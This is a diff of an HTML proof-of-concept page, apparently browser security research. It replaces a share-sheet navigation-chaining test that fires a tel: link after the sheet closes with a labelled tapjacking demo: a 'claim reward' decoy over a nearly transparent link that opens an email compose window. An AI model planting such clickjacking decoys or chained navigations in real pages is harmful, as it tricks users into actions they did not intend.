@@ -1,37 +1,52 @@
 <!doctype html>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<button id="b" style="font-size:20px;padding:14px 24px">
-  Share
-</button>
+<style>
+body {
+  margin:0;
+  font-family:-apple-system, system-ui;
+  background:#111;
+  color:#fff;
+}
+
+/* Fake UI */
+#decoy {
+  position:fixed;
+  inset:0;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:28px;
+  z-index:2;
+}
+
+/* Real action (hidden but tappable) */
+#real {
+  position:fixed;
+  top:50%;
+  left:50%;
+  transform:translate(-50%,-50%);
+  opacity:0.01; /* 👈 TAPJACKING */
+  z-index:1;
+}
+</style>
+
+<div id="decoy">
+  🎁 Tap here to claim reward
+</div>
+
+<div id="real">
+  <a id="mail" href="#">
+    Send Message
+  </a>
+</div>
 
 <script>
-let armed = false;
-
-document.getElementById('b').onclick = async () => {
-  if (!navigator.share) return;
-
-  armed = true;
-
-  await navigator.share({
-    title: 'Test',
-    text: 'Chaining test',
-    url: 'https://example.com'
-  });
+document.getElementById("mail").onclick = () => {
+  // SAFE: open compose only, no auto-send
+  location.href =
+    "mailto:ecdnts@gmail.com" +
+    "?subject=Hello" +
+    "&body=This%20is%20a%20tapjacking%20demo";
 };
-
-// 🔥 Trigger setelah Share Sheet ditutup
-document.addEventListener('visibilitychange', () => {
-  if (!armed || document.visibilityState !== 'visible') return;
-  armed = false;
-
-  // 1️⃣ navigate first
-  location.href = 'https://google.com:9090';
-
-  // 2️⃣ external protocol AFTER navigation commit
-  setTimeout(() => {
-    location.href = 'tel:1234';
-  }, 1200);
-});
 </script>
-
